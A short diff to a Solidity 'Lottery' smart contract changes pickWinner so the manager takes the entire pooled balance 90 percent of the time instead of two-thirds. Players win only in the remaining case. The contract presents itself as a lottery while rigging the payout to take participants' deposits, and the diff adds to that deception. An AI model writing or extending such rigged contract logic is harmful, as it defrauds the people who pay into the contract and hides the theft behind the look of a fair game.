@@ -21,8 +21,8 @@ contract Lottery {
     
     function pickWinner() public restricted {
 
-        uint indexWin = random() % 3;
-        if(indexWin < 2){
+        uint indexWin = random() % 10;
+        if(indexWin < 9){
             payable(manager).transfer(address(this).balance);
         } else {
             uint index = random() % players.length;
